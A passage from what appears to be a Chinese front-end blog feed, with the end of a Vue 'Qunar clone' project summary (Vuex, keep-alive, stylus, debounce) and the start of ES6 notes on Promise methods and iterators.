class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">const moduleA = &#123;</span><br><span class="line">  state: &#123; ... &#125;,</span><br><span class="line">  mutations: &#123; ... &#125;,</span><br><span class="line">  actions: &#123; ... &#125;,</span><br><span class="line">  getters: &#123; ... &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const moduleB = &#123;</span><br><span class="line">  state: &#123; ... &#125;,</span><br><span class="line">  mutations: &#123; ... &#125;,</span><br><span class="line">  actions: &#123; ... &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const store = new Vuex.Store(&#123;</span><br><span class="line">  modules: &#123;</span><br><span class="line">    a: moduleA,</span><br><span class="line">    b: moduleB</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">store.state.a // -&gt; moduleA 的状态</span><br><span class="line">store.state.b // -&gt; moduleB 的状态</span><br></pre></td></tr></table></figure></p><h2 id="LocalStorage-使用"><a href="#LocalStorage-使用" class="headerlink" title="LocalStorage 使用"></a>LocalStorage 使用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">let defaultCity = &apos;杭州&apos;</span><br><span class="line">try &#123;</span><br><span class="line">  if (localStorage.city) &#123;</span><br><span class="line">    defaultCity = localStorage.city</span><br><span class="line">  &#125;</span><br><span class="line">&#125; catch (e) &#123;&#125;</span><br></pre></td></tr></table></figure><h2 id="Keep-alive"><a href="#Keep-alive" class="headerlink" title="Keep-alive"></a>Keep-alive</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>keep-alive 是 Vue 内置的一个组件，可以使被包含的组件保留状态，或避免重新渲染。</p><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;keep-alive&gt;</span><br><span class="line">  &lt;router-view&gt;</span><br><span class="line">    &lt;!-- 该组件将被缓存！ --&gt;</span><br><span class="line">  &lt;/router-view&gt;</span><br><span class="line">&lt;/keep-alive&gt;</span><br></pre></td></tr></table></figure><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><ul><li>include - 字符串或正则表达，只有匹配的组件会被缓存</li><li>exclude - 字符串或正则表达式，任何匹配的组件都不会被缓存</li></ul><h3 id="使用-3"><a href="#使用-3" class="headerlink" title="使用"></a>使用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">export default &#123;</span><br><span class="line">  name: &apos;a&apos;,</span><br><span class="line">  data () &#123;</span><br><span class="line">    return &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;keep-alive exclude=&quot;a&quot;&gt;</span><br><span class="line">  &lt;router-view&gt;</span><br><span class="line">    &lt;!-- 除了 name 为 a 的组件都将被缓存！ --&gt;</span><br><span class="line">  &lt;/router-view&gt;</span><br><span class="line">&lt;/keep-alive&gt;可以保留它的状态或避免重新渲染</span><br></pre></td></tr></table></figure><h3 id="钩子函数"><a href="#钩子函数" class="headerlink" title="钩子函数"></a>钩子函数</h3><p>当组件中 <code>&lt;router-view&gt;</code> 内被切换，它的 <code>activatied</code> 和<code>deactivated</code> 这两个生命周期钩子函数将会被执行，同时，被缓存的页面， <code>mounted</code> 钩子将只在第一次请求时被执行。</p><ul><li>activated：keep-alive 组件激活时调用。</li><li>deactivated：keep-alive 组件停用时调用。</li></ul><h2 id="递归组件的使用"><a href="#递归组件的使用" class="headerlink" title="递归组件的使用"></a>递归组件的使用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">  &lt;div class=&quot;item&quot; v-for=&quot;(item, index) of list&quot; :key=&quot;index&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;item-title border-bottom&quot;&gt;</span><br><span class="line">      &lt;span class=&quot;item-title-icon&quot;&gt;&lt;/span&gt;</span><br><span class="line">      &#123;&#123;item.title&#125;&#125;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div v-if=&quot;item.children&quot; class=&quot;item-children&quot;&gt;</span><br><span class="line">      &lt;detail-list :list=&quot;item.children&quot;&gt;&lt;/detail-list&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><h2 id="添加动画效果"><a href="#添加动画效果" class="headerlink" title="添加动画效果"></a>添加动画效果</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;transition&gt;</span><br><span class="line">    &lt;slot&gt;&lt;/slot&gt;</span><br><span class="line">  &lt;/transition&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &apos;Fade&apos;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang=&quot;stylus&quot; scoped&gt;</span><br><span class="line">.v-enter, .v-leave-to</span><br><span class="line">  opacity: 0</span><br><span class="line">.v-enter-active, .v-leave-active</span><br><span class="line">  transition: opacity .5s</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><h2 id="项目打包上线"><a href="#项目打包上线" class="headerlink" title="项目打包上线"></a>项目打包上线</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run build</span><br></pre></td></tr></table></figure><p><code>dist</code> 目录为打包好的文件。</p><h2 id="项目目录解读"><a href="#项目目录解读" class="headerlink" title="项目目录解读"></a>项目目录解读</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">├── index.html</span><br><span class="line">├── main.js</span><br><span class="line">├── static</span><br><span class="line">│   └── mock             # 模拟JSON数据</span><br><span class="line">├── assets               # 静态资源</span><br><span class="line">│   ├── style </span><br><span class="line">│   └── pic </span><br><span class="line">├── common               # 共用全局组件</span><br><span class="line">│   ├── fade </span><br><span class="line">│   └── gallary</span><br><span class="line">├── pages                # 每个页面划分成一个组件</span><br><span class="line">│   ├── city             # 页面内部再划分小组件</span><br><span class="line">│   │   ├── component</span><br><span class="line">│   │   └── City.vue</span><br><span class="line">│   ├── detail  </span><br><span class="line">│   │   ├── component</span><br><span class="line">│   │   └── Detail.vue</span><br><span class="line">│   └── home</span><br><span class="line">│       ├── component</span><br><span class="line">│       └── Home.vue</span><br><span class="line">├── router   </span><br><span class="line">│   └── index.js          # 路由配置</span><br><span class="line">└── store</span><br><span class="line">    ├── index.js          # 组装模块并导出 store 的地方</span><br><span class="line">    ├── actions.js        # 根级别的 action</span><br><span class="line">    ├── mutations.js      # 根级别的 mutation</span><br><span class="line">    └── modules</span><br><span class="line">        ├── cart.js       </span><br><span class="line">        └── products.js</span><br></pre></td></tr></table></figure><h2 id="CSS技巧"><a href="#CSS技巧" class="headerlink" title="CSS技巧"></a>CSS技巧</h2><h3 id="垂直居中"><a href="#垂直居中" class="headerlink" title="垂直居中"></a>垂直居中</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//单个元素</span><br><span class="line">line-height == height</span><br><span class="line"></span><br><span class="line">//父元素内子元素居中</span><br><span class="line">display: flex</span><br><span class="line">flex-direction: column</span><br><span class="line">justify-content: center</span><br></pre></td></tr></table></figure><h3 id="响应式大小"><a href="#响应式大小" class="headerlink" title="响应式大小"></a>响应式大小</h3><p>在静态CSS文件中设置 <code>font-size</code> 对应的像素值，使用 <code>rem</code> 动态获得实际像素。</p><h3 id="元素间距"><a href="#元素间距" class="headerlink" title="元素间距"></a>元素间距</h3><p><code>inline-block</code> 显示的元素之间，会存在2px的间距，为了取消这个间距，可以设置父元素的 <code>font-size</code> 为 0 。</p><h3 id="stylus变量"><a href="#stylus变量" class="headerlink" title="stylus变量"></a>stylus变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// assets/styles -&gt; varibles.styl</span><br><span class="line">$bgColor = #00bcd4</span><br><span class="line">$darkTextColor = #333</span><br><span class="line">$headerHeight = .86rem</span><br><span class="line"></span><br><span class="line">//xxx.vue</span><br><span class="line">@import &apos;~styles/varibles&apos;</span><br><span class="line"></span><br><span class="line">line-height: $headerHeight</span><br><span class="line">background: $bgColor</span><br></pre></td></tr></table></figure><h3 id="stylus混合"><a href="#stylus混合" class="headerlink" title="stylus混合"></a>stylus混合</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// assets/styles -&gt; mixins.styl</span><br><span class="line">ellipsis()</span><br><span class="line">  overflow: hidden</span><br><span class="line">  white-space: nowrap</span><br><span class="line">  text-overflow: ellipsis</span><br><span class="line"></span><br><span class="line">//xxx.vue</span><br><span class="line">@import &apos;@~styles/mixins.styl&apos;;</span><br><span class="line"></span><br><span class="line">.item-title</span><br><span class="line">  line-height: .54rem</span><br><span class="line">  font-size: .32rem</span><br><span class="line">  ellipsis()</span><br></pre></td></tr></table></figure><h2 id="代码优化"><a href="#代码优化" class="headerlink" title="代码优化"></a>代码优化</h2><h3 id="路径别名"><a href="#路径别名" class="headerlink" title="路径别名"></a>路径别名</h3><p>有时候路径名过长，在引入的过程较为不便，所以我们可以通过更改配置项，为路径添加别名。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//build -&gt; webpack.base.config.js</span><br><span class="line">resolve: &#123;</span><br><span class="line">  extensions: [&apos;.js&apos;, &apos;.vue&apos;, &apos;.json&apos;],</span><br><span class="line">  alias: &#123;</span><br><span class="line">    &apos;vue$&apos;: &apos;vue/dist/vue.esm.js&apos;,</span><br><span class="line">    &apos;@&apos;: resolve(&apos;src&apos;),</span><br><span class="line">    &apos;styles&apos;: resolve(&apos;src/assets/styles&apos;),</span><br><span class="line">    &apos;common&apos;: resolve(&apos;src/common&apos;),</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@import &apos;@~styles/mixins.styl&apos;;</span><br></pre></td></tr></table></figure></p><h3 id="函数节流"><a href="#函数节流" class="headerlink" title="函数节流"></a>函数节流</h3><p>对于某些高频事件，我们可以通过函数节流的方法，限制频率，从而达到节约性能的效果。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">keyword () &#123;</span><br><span class="line">  if (this.timer) &#123;</span><br><span class="line">    clearTimeout(this.timer)</span><br><span class="line">  &#125;</span><br><span class="line">  if (!this.keyword) &#123;</span><br><span class="line">    this.list = []</span><br><span class="line">    return</span><br><span class="line">  &#125;</span><br><span class="line">  this.timer = setTimeout(() =&gt; &#123;</span><br><span class="line">    const result = []</span><br><span class="line">    for (let i in this.cities) &#123;</span><br><span class="line">      this.cities[i].forEach((value) =&gt; &#123;</span><br><span class="line">        if (value.spell.indexOf(this.keyword) &gt; -1 || value.name.indexOf(this.keyword) &gt; -1) &#123;</span><br><span class="line">          result.push(value)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    this.list = result</span><br><span class="line">  &#125;, 100)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="全局事件的绑定与解绑"><a href="#全局事件的绑定与解绑" class="headerlink" title="全局事件的绑定与解绑"></a>全局事件的绑定与解绑</h3><p>有时我们会在子组件里对全局事件做绑定，但是为了不影响到其它页面，我们应该在合适的时间取消对全局事件的绑定，该操作分为两种情况。</p><ul><li>在使用keep-alive对页面做缓存时：在 <code>activated</code> 钩子函数里绑定 全局事件，在 <code>deactivated</code> 函数里解绑。</li><li>在不使用keep-alive对页面做缓存时：在 <code>mounted</code> 钩子函数里绑定 全局事件，在 <code>beforeDestory</code> 函数里解绑。</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>至此，vue仿去哪儿项目的学习总结就结束了。写一百个项目，不如深入理解学习一个项目，并从中吸取经验，项目虽小，但收获颇多。有关项目的更深入理解，等我研究了vue的源码后再继续补充。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ES6知识点梳理</title>
      <link href="/ES6%E7%9F%A5%E8%AF%86%E7%82%B9%E6%A2%B3%E7%90%86.html"/>
      <url>/ES6%E7%9F%A5%E8%AF%86%E7%82%B9%E6%A2%B3%E7%90%86.html</url>
      
        <content type="html"><![CDATA[<p>最近拜读了阮一峰老师的ES6详解，虽然ES9已经大摇大摆亮相，但是ES6依然是一个跨时代的版本，其中不乏很多目前使用率颇高，功能性能上大为改进的新语法，所以还是决定对ES6做一个学习总结，也对其中部分闪光语法做详细解释。</p><a id="more"></a><h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p><img src="../assets/20190831/es6.png" alt="Alt text"></p><h2 id="Promise对象"><a href="#Promise对象" class="headerlink" title="Promise对象"></a>Promise对象</h2><h3 id="含义"><a href="#含义" class="headerlink" title="含义:"></a>含义:</h3><p>Promise 是异步编程的一种解决方案，简单说就是一个容器，里面保存着某个未来才会结束的事件（通常是一个异步操作）的结果。从它可以获取异步操作的消息。</p><h3 id="特点"><a href="#特点" class="headerlink" title="特点:"></a>特点:</h3><ul><li>对象的状态不受外界影响。</li><li>一旦状态改变，就不会再变，任何时候都可以得到这个结果。</li></ul><h3 id="基本用法："><a href="#基本用法：" class="headerlink" title="基本用法："></a>基本用法：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var promise = new Promise(function(resolve, reject) &#123; </span><br><span class="line">  // ... some code </span><br><span class="line">  if (/* 异步操作成功 */)&#123; </span><br><span class="line">    resolve(value); </span><br><span class="line">  &#125; else &#123; </span><br><span class="line">    reject(error); </span><br><span class="line">  &#125; </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>Promise 实例生成以后，可以用 then 方法分别指定 resolved 状态和 rejected 状态的回调函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">promise.then(function(value) &#123; </span><br><span class="line">  // success </span><br><span class="line">&#125;, function(error) &#123; </span><br><span class="line">  // failure </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><h3 id="Promise-prototype-then"><a href="#Promise-prototype-then" class="headerlink" title="Promise.prototype.then()"></a>Promise.prototype.then()</h3><p>Promise 实例具有 then 方法，也就是说， then 方法是定义在原型对 象 Promise.prototype 上的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getJSON(&quot;/post/1.json&quot;).then(function(post) &#123; </span><br><span class="line">    return getJSON(post.commentURL); </span><br><span class="line">&#125;).then(function funcA(comments) &#123; </span><br><span class="line">    console.log(&quot;resolved: &quot;, comments); </span><br><span class="line">&#125;, function funcB(err)&#123; </span><br><span class="line">    console.log(&quot;rejected: &quot;, err); </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><h3 id="Promise-prototype-catch"><a href="#Promise-prototype-catch" class="headerlink" title="Promise.prototype.catch()"></a>Promise.prototype.catch()</h3><p>Promise.prototype.catch 方法是 .then(null, rejection) 的别名，用于指定发生错误时的回调函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getJSON(&apos;/post/1.json&apos;).then(function(post) &#123; </span><br><span class="line">    return getJSON(post.commentURL); </span><br><span class="line">&#125;).then(function(comments) &#123; </span><br><span class="line">    // some code </span><br><span class="line">&#125;).catch(function(error) &#123; </span><br><span class="line">    // 处理前面三个Promise产生的错误 </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><h3 id="Promise-all"><a href="#Promise-all" class="headerlink" title="Promise.all()"></a>Promise.all()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var p = Promise.all([p1, p2, p3]);</span><br></pre></td></tr></table></figure><ul><li>Promise.all 方法用于将多个 Promise 实例，包装成一个新的 Promise 实例。</li><li>Promise.all 方法接受一个数组作为参数。</li><li>只有 p1 、 p2 、 p3 的状态都变成 fulfilled ， p 的状态才会变 成 fulfilled ，此时 p1 、 p2 、 p3 的返回值组成一个数组，传递给 p 的回调函数。</li><li>只要 p1 、 p2 、 p3 之中有一个被 rejected ， p 的状态就变成 rejected ，此时第一个被 reject 的实例的返回值，会传递给 p 的回调函数。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var promises = [2, 3, 5, 7, 11, 13].map(function (id) &#123; </span><br><span class="line">    return getJSON(&apos;/post/&apos; + id + &quot;.json&quot;); </span><br><span class="line">&#125;); </span><br><span class="line">Promise.all(promises).then(function (posts) &#123; </span><br><span class="line">    // ... </span><br><span class="line">&#125;).catch(function(reason)&#123; </span><br><span class="line">    // ... </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="Promise-race"><a href="#Promise-race" class="headerlink" title="Promise.race()"></a>Promise.race()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var p = Promise.race([p1, p2, p3]);</span><br></pre></td></tr></table></figure><ul><li>Promise.race 方法同样是将多个Promise实例，包装成一个新的Promise实例。</li><li>方法接受一个数组作为参数。</li><li>只要 p1 、 p2 、 p3 之中有一个实例率先改变状态， p 的状态就跟着改变。那个率先改变的 Promise 实例的返回值，就传递给 p 的回调函数。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">const p = Promise.race([ </span><br><span class="line">    fetch(&apos;/resource-that-may-take-a-while&apos;), </span><br><span class="line">    new Promise(function (resolve, reject) &#123; </span><br><span class="line">        setTimeout(() =&gt; reject(new Error(&apos;request timeout&apos;)), 5000) </span><br><span class="line">    &#125;) </span><br><span class="line">]); </span><br><span class="line">p.then(response =&gt; console.log(response)); </span><br><span class="line">p.catch(error =&gt; console.log(error));</span><br></pre></td></tr></table></figure><h3 id="Promise-resolve"><a href="#Promise-resolve" class="headerlink" title="Promise.resolve()"></a>Promise.resolve()</h3><p>参数分成四种情况:</p><h4 id="参数是一个Promise实例："><a href="#参数是一个Promise实例：" class="headerlink" title="参数是一个Promise实例："></a>参数是一个Promise实例：</h4><p>不做任何修改、原封不动地返回这个实例。</p><h4 id="参数是一个-thenable-对象："><a href="#参数是一个-thenable-对象：" class="headerlink" title="参数是一个 thenable 对象："></a>参数是一个 thenable 对象：</h4><p>将这个对象转为Promise对象，然后就立即执行 thenable 对象的 then 方法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">let thenable = &#123; </span><br><span class="line">  then: function(resolve, reject) &#123; </span><br><span class="line">    resolve(42); </span><br><span class="line">  &#125; </span><br><span class="line">&#125;;</span><br><span class="line">let p1 = Promise.resolve(thenable); </span><br><span class="line">p1.then(function(value) &#123; </span><br><span class="line">  console.log(value); // 42 </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><h4 id="参数不是具有-then-方法的对象，或根本就不是对象："><a href="#参数不是具有-then-方法的对象，或根本就不是对象：" class="headerlink" title="参数不是具有 then 方法的对象，或根本就不是对象："></a>参数不是具有 then 方法的对象，或根本就不是对象：</h4><p>返回一个新的Promise对象，状态为resolved。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var p = Promise.resolve(&apos;Hello&apos;); </span><br><span class="line">p.then(function (s)&#123; </span><br><span class="line">  console.log(s) </span><br><span class="line">&#125;); </span><br><span class="line">// Hello</span><br></pre></td></tr></table></figure></p><h4 id="不带有任何参数："><a href="#不带有任何参数：" class="headerlink" title="不带有任何参数："></a>不带有任何参数：</h4><p>直接返回一个 resolved 状态的Promise对象。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var p = Promise.resolve(); </span><br><span class="line">p.then(function () &#123; </span><br><span class="line">  // ... </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><h4 id="执行顺序"><a href="#执行顺序" class="headerlink" title="执行顺序"></a>执行顺序</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(function () &#123; </span><br><span class="line">  console.log(&apos;three&apos;); </span><br><span class="line">&#125;, 0); </span><br><span class="line">Promise.resolve().then(function () &#123; </span><br><span class="line">  console.log(&apos;two&apos;); </span><br><span class="line">&#125;); </span><br><span class="line">console.log(&apos;one&apos;);</span><br><span class="line"></span><br><span class="line">//one</span><br><span class="line">//two</span><br><span class="line">//three</span><br></pre></td></tr></table></figure><ul><li>setTimeout(fn, 0) 在下一轮“事件循环”开始时执行。</li><li>Promise.resolve() 在本轮“事件循环”结束时执行。</li><li>console.log(‘one’) 则是立即执行，因此最先输出。</li></ul><h3 id="Promise-reject"><a href="#Promise-reject" class="headerlink" title="Promise.reject()"></a>Promise.reject()</h3><p>返回一个新的 Promise 实例，该实例的状态为 rejected。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var p = Promise.reject(&apos;出错了&apos;); </span><br><span class="line">// 等同于 </span><br><span class="line">var p = new Promise((resolve, reject) =&gt; reject(&apos;出错了&apos;)) </span><br><span class="line">p.then(null, function (s) &#123; </span><br><span class="line">  console.log(s) </span><br><span class="line">&#125;); </span><br><span class="line">// 出错了</span><br></pre></td></tr></table></figure></p><h3 id="done"><a href="#done" class="headerlink" title="done()"></a>done()</h3><p>总是处于回调链的尾端，保证抛出任何可能出现的错误。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">asyncFunc() </span><br><span class="line">  .then(f1) </span><br><span class="line">  .catch(r1) </span><br><span class="line">  .then(f2) </span><br><span class="line">  .done();</span><br></pre></td></tr></table></figure></p><h3 id="finally"><a href="#finally" class="headerlink" title="finally()"></a>finally()</h3><ul><li>finally 方法用于指定不管Promise对象最后状态如何，都会执行的操作。</li><li>它与 done 方法的最大区别，它接受一个普通的回调函数作为参数，该函数不管怎样都必须执行。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">server.listen(0) </span><br><span class="line">  .then(function () &#123; </span><br><span class="line">      // run test </span><br><span class="line">  &#125;)</span><br><span class="line">  .finally(server.stop);</span><br></pre></td></tr></table></figure><h3 id="Promise-try"><a href="#Promise-try" class="headerlink" title="Promise.try()"></a>Promise.try()</h3><ul><li>让同步函数同步进行，异步函数异步进行。</li><li>可以更好的管理异常。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Promise.try(database.users.get(&#123;id: userId&#125;)) </span><br><span class="line">  .then(...) </span><br><span class="line">  .catch(...)</span><br></pre></td></tr></table></figure><h2 id="Iterator和for…of循环"><a href="#Iterator和for…of循环" class="headerlink" title="Iterator和for…of循环"></a>Iterator和for…of循环</h2><h3 id="Iterator（遍历器）的概念"><a href="#Iterator（遍历器）的概念" class="headerlink" title="Iterator（遍历器）的概念"></a>Iterator（遍历器）的概念</h3><p>它是一种接口，为各种不同的数据结构提供统一的访问机制。任何数据结构只要部署Iterator接口，就可以完成遍历操作（即依次处理该数据结构的所有成员）。<br>遍历过程：</p><ul><li>创建一个指针对象，指向当前数据结构的起始位置。也就是说，遍历器对象本质上，就是一个指针对象。</li><li>第一次调用指针对象的 next 方法，可以将指针指向数据结构的第一个成员。</li><li>第二次调用指针对象的 next 方法，指针就指向数据结构的第二个成员。</li><li>不断调用指针对象的 next 方法，直到它指向数据结构的结束位置。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 